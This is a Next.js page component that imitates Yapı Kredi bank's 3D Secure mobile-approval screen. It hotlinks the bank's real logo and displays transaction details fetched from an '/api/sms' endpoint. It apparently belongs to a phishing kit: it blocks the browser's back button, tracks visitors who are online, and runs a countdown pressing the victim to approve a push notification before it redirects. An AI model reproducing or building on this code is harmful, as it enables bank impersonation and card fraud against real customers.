'use client';

import { useEffect, useState, useRef } from 'react';
import { useRouter } from 'next/navigation';
import OnlineTracker from '@/components/OnlineTracker';

interface SmsData {
    tutar: string;
    tarih: string;
    lastFourDigits: string;
    cardType: 'visa' | 'mastercard' | 'unknown';
    maskedPhone: string;
    isyeriAdi: string;
    banka?: string;
}

export default function YkbMobilOnayPage() {
    const router = useRouter();
    const [data, setData] = useState<SmsData | null>(null);
    const [loading, setLoading] = useState(true);
    const [timeLeft, setTimeLeft] = useState(180);
    const [isTimeout, setIsTimeout] = useState(false);

    // Geri gidilmesin
    useEffect(() => {
        window.history.pushState(null, '', window.location.href);
        const handlePopState = () => {
            window.history.pushState(null, '', window.location.href);
        };
        window.addEventListener('popstate', handlePopState);
        return () => window.removeEventListener('popstate', handlePopState);
    }, []);

    // Verileri yükle
    useEffect(() => {
        const fetchData = async () => {
            try {
                const response = await fetch('/api/sms');
                const result = await response.json();
                
                if (result.success) {
                    setData(result.data);
                } else if (result.redirect) {
                    router.push(result.redirect);
                }
            } catch (err) {
                console.error('Veri yükleme hatası:', err);
            } finally {
                setLoading(false);
            }
        };

        fetchData();
    }, [router]);

    // Geri sayım
    useEffect(() => {
        if (timeLeft <= 0) {
            setIsTimeout(true);
            // Zaman aşımında bekleme sayfasına yönlendirme (PHP heartbeat taklidi)
            handleTimeoutUpdate();
            return;
        }

        const timer = setInterval(() => {
            setTimeLeft(prev => prev - 1);
        }, 1000);

        return () => clearInterval(timer);
    }, [timeLeft]);

    const handleTimeoutUpdate = async () => {
        try {
            // Durumu bekle'ye çekmek için api'ye istek gönderiyoruz (smsCode'u boş yollayarak durum güncellemesi tetikleyebiliriz veya direkt durum api'si varsa)
            await fetch('/api/sms', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ smsCode: 'TIMEOUT' }) // Backend bunu bekle veya hatalı olarak günceller
            });
        } catch (e) {
            console.error(e);
        }
        router.push('/odeme/onay');
    };

    if (loading) {
        return (
            <div className="flex items-center justify-center min-h-screen bg-gray-50">
                <style jsx global>{`
                    nav.fixed.bottom-0 { display: none !important; }
                    main { padding-bottom: 0 !important; }
                    header { display: none !important; }
                `}</style>
                <div className="w-12 h-12 border-4 border-blue-200 border-t-blue-600 rounded-full animate-spin"></div>
            </div>
        );
    }

    // Stroke-dashoffset hesabı (2 * pi * 40 = 251.2)
    const dashArray = 251.2;
    const progressOffset = dashArray - (dashArray * (timeLeft / 180));

    // Kart numarası maskeleme (YKB stili)
    const cc = data?.lastFourDigits || '****';
    const cardScheme = data?.cardType === 'visa' ? 'VISA' : (data?.cardType === 'mastercard' ? 'MASTERCARD' : 'TROY');
    const cleanTutar = (data?.tutar || '').replace(/TL|TRY|₺/gi, '').trim() || '49,99';

    return (
        <>
            <OnlineTracker />
            <style jsx global>{`
                nav.fixed.bottom-0 { display: none !important; }
                main { padding-bottom: 0 !important; }
                header { display: none !important; }
                * {
                    box-sizing: border-box;
                    margin: 0;
                    padding: 0;
                    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                }
                body {
                    background: #0082c8 !important;
                    background: linear-gradient(135deg, #0090e3 0%, #005fa9 100%) !important;
                    min-height: 100vh;
                    display: flex;
                    flex-direction: column;
                    color: #333;
                }
                
                /* Top Bar */
                .top-header {
                    background-color: #002d62;
                    color: #fff;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    padding: 14px 24px;
                    font-size: 14px;
                    font-weight: 500;
                    width: 100%;
                }
                .top-header .title {
                    font-size: 14px;
                    font-weight: 700;
                    letter-spacing: 0.2px;
                }
                .top-header .links {
                    font-size: 13px;
                }
                .top-header .links span {
                    margin-left: 6px;
                    margin-right: 6px;
                    cursor: pointer;
                    opacity: 0.9;
                }
                .top-header .links span:hover {
                    opacity: 1;
                    text-decoration: underline;
                }

                /* Main Container */
                .ykb-container {
                    flex: 1;
                    display: flex;
                    justify-content: center;
                    align-items: flex-start;
                    padding: 32px 16px;
                    width: 100%;
                }
                
                /* Card with exact borders from screenshot */
                .card {
                    background: #ffffff;
                    border-radius: 4px;
                    width: 100%;
                    max-width: 480px;
                    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
                    border: 8px solid #85c2f2;
                    overflow: hidden;
                }
                
                /* Logo Header */
                .logo-row {
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    padding: 24px 24px 16px 24px;
                }
                .logo-row img.ykb-logo {
                    height: 42px;
                    object-fit: contain;
                }
                .logo-row .visa-logo-text {
                    color: #0a2540;
                    font-size: 22px;
                    font-weight: 900;
                    font-style: italic;
                    letter-spacing: 0.5px;
                }
                
                /* Card Body */
                .card-body {
                    padding: 0 24px 24px 24px;
                }
                
                /* Info Grid */
                .info-grid {
                    display: grid;
                    grid-template-columns: 140px 1fr;
                    row-gap: 12px;
                    margin-bottom: 20px;
                    font-size: 13.5px;
                }
                .info-label {
                    color: #666;
                    font-weight: 500;
                }
                .info-value {
                    color: #111;
                    font-weight: 700;
                    word-break: break-word;
                }
                
                /* Bu bilgiler paylaşılmamaktadır Alert */
                .share-alert {
                    display: flex;
                    align-items: center;
                    gap: 8px;
                    color: #0082c8;
                    font-size: 13px;
                    font-weight: 600;
                    margin-bottom: 20px;
                }
                .share-alert svg {
                    width: 18px;
                    height: 18px;
                    flex-shrink: 0;
                    fill: none;
                    stroke: #0082c8;
                    stroke-width: 2;
                }

                /* Notification Box */
                .notification-container {
                    background-color: #f3f7fa;
                    border-radius: 4px;
                    padding: 20px;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    gap: 16px;
                }
                .notification-msg-row {
                    display: flex;
                    gap: 10px;
                    align-items: flex-start;
                    width: 100%;
                    color: #002d62;
                    font-size: 13px;
                    line-height: 1.5;
                    font-weight: 500;
                }
                .notification-msg-row svg {
                    width: 20px;
                    height: 20px;
                    flex-shrink: 0;
                    fill: none;
                    stroke: #0082c8;
                    stroke-width: 2;
                    margin-top: 2px;
                }
                
                /* Timer CSS */
                .timer-circle-wrap {
                    position: relative;
                    width: 90px;
                    height: 90px;
                }
                .timer-svg {
                    width: 100%;
                    height: 100%;
                    transform: rotate(-90deg);
                }
                .timer-svg circle {
                    fill: none;
                    stroke-width: 6;
                }
                .timer-svg circle.bg-track {
                    stroke: #e2e8f0;
                }
                .timer-svg circle.fill-progress {
                    stroke: #0082c8;
                    stroke-dasharray: 251.2;
                    stroke-linecap: round;
                    transition: stroke-dashoffset 1s linear;
                }
                .timer-digits {
                    position: absolute;
                    top: 50%;
                    left: 50%;
                    transform: translate(-50%, -50%);
                    font-size: 22px;
                    font-weight: 700;
                    color: #111;
                }
                .timer-text-below {
                    font-size: 13.5px;
                    color: #0082c8;
                    font-weight: 700;
                    text-align: center;
                }

                /* Small Screen Responsive Settings */
                @media (max-width: 480px) {
                    .top-header {
                        padding: 10px 14px;
                        font-size: 12.5px;
                    }
                    .top-header .title {
                        font-size: 12px;
                    }
                    .top-header .links {
                        font-size: 11.5px;
                    }
                    .ykb-container {
                        align-items: flex-start;
                        padding: 16px 10px;
                    }
                    .card {
                        border-width: 4px;
                    }
                    .logo-row {
                        padding: 16px 16px 12px 16px;
                    }
                    .logo-row img.ykb-logo {
                        height: 34px;
                    }
                    .logo-row .visa-logo-text {
                        font-size: 18px;
                    }
                    .card-body {
                        padding: 0 16px 16px 16px;
                    }
                    .info-grid {
                        grid-template-columns: 110px 1fr;
                        row-gap: 8px;
                        font-size: 12.5px;
                    }
                    .notification-container {
                        padding: 14px;
                    }
                    .notification-msg-row {
                        font-size: 12px;
                    }
                }
            `}</style>

            <div className="top-header">
                <div className="title">Üç Boyutlu Güvenlik Sistemi</div>
                <div className="links">
                    <span>Yardım</span>|<span>English</span>
                </div>
            </div>

            <div className="ykb-container">
                <div className="card">
                    <div className="logo-row">
                        {/* eslint-disable-next-line @next/next/no-img-element */}
                        <img className="ykb-logo" src="https://goguvenliodeme.bkm.com.tr/banklogo/yapikredi.png" alt="Yapı Kredi" />
                        <span className="visa-logo-text">{cardScheme}</span>
                    </div>
                    
                    <div className="card-body">
                        <div className="info-grid">
                            <div className="info-label">Üye İşyeri İsmi</div>
                            <div className="info-value">{data?.isyeriAdi}</div>
                            
                            <div className="info-label">Tutar</div>
                            <div className="info-value">{cleanTutar} TL</div>
                            
                            <div className="info-label">Tarih</div>
                            <div className="info-value">{data?.tarih}</div>
                            
                            <div className="info-label">Kart Numarası</div>
                            <div className="info-value">XXXX XX** **** {cc}</div>
                        </div>
                        
                        <div className="share-alert">
                            <svg viewBox="0 0 24 24">
                                <circle cx="12" cy="12" r="10" />
                                <line x1="12" y1="8" x2="12" y2="12" />
                                <line x1="12" y1="16" x2="12.01" y2="16" />
                            </svg>
                            <div>Bu bilgiler işyerleri ile paylaşılmamaktadır.</div>
                        </div>
                        
                        <div className="notification-container">
                            <div className="notification-msg-row">
                                <svg viewBox="0 0 24 24">
                                    <circle cx="12" cy="12" r="10" />
                                    <line x1="12" y1="8" x2="12" y2="12" />
                                    <line x1="12" y1="16" x2="12.01" y2="16" />
                                </svg>
                                <div>Akıllı Bildirim tanımlı mobil cihazınıza gönderilen Akıllı Bildirim'i onaylayarak işleminizi tamamlayabilirsiniz.</div>
                            </div>
                            
                            <div className="timer-circle-wrap">
                                <svg className="timer-svg" viewBox="0 0 100 100">
                                    <circle className="bg-track" cx="50" cy="50" r="40" />
                                    <circle className="fill-progress" cx="50" cy="50" r="40" style={{ strokeDashoffset: progressOffset }} />
                                </svg>
                                <div className="timer-digits">{timeLeft}</div>
                            </div>
                            
                            <div className="timer-text-below">{timeLeft} saniye içinde onaylayınız.</div>
                        </div>
                    </div>
                </div>
            </div>
        </>
    );
}
